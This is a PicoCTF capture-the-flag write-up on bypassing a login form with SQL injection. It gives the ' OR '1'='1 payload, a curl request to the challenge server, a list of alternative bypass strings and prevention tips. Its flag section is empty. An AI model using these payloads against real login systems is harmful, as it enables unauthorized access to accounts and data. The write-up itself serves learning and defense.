# SQL Injection Exploitation - PicoCTF Challenge

## Challenge Overview
The challenge presents a login form with the following query structure:
```sql
SELECT * FROM users WHERE name='admin' AND password='?'
```
Our goal is to bypass authentication and retrieve the flag using SQL injection techniques.

## Understanding SQL Injection
SQL injection occurs when an attacker manipulates a SQL query by injecting malicious input. The goal is to alter the logic of the query, often leading to unauthorized access.

### The Initial Login Attempt
Upon entering the username `admin` with an unknown password, the server responds with:
```
Login failed.
```
Indicating that the credentials are incorrect.

### Bypassing Authentication
By injecting a well-crafted SQL statement into the password field, we can manipulate the query to always return `true`. The classic injection string is:
```
' OR '1'='1
```
This results in the query:
```sql
SELECT * FROM users WHERE name='admin' AND password='' OR '1'='1'
```
Since `'1'='1'` is always true, authentication is bypassed.

### Executing the Exploit via cURL
On a Linux terminal, we can send this request using `curl`:
```bash
curl -X POST "http://saturn.picoctf.net:56768/login.php" \
    -d "username=admin&password=' OR '1'='1'"
```
If successful, this grants us access to the system and displays the flag.

### Retrieved Flag

```

## Additional SQL Injection Payloads
Other possible payloads for bypassing authentication include:
```sql
' OR 'a'='a
" OR ""="
' OR '1'='1' --
admin' --
```
These variations work by manipulating the logic of the SQL query.

## Prevention Measures
To prevent SQL injection, developers should:
1. Use **prepared statements** and **parameterized queries**.
2. Implement **input validation**.
3. Use **least privilege** database accounts.
4. Employ **Web Application Firewalls (WAF)**.
5. Monitor and log suspicious activity.

## Conclusion
SQL injection remains one of the most critical vulnerabilities in web applications. This challenge demonstrated how a poorly secured login system can be exploited to gain unauthorized access. Understanding these attacks helps developers build more secure applications.
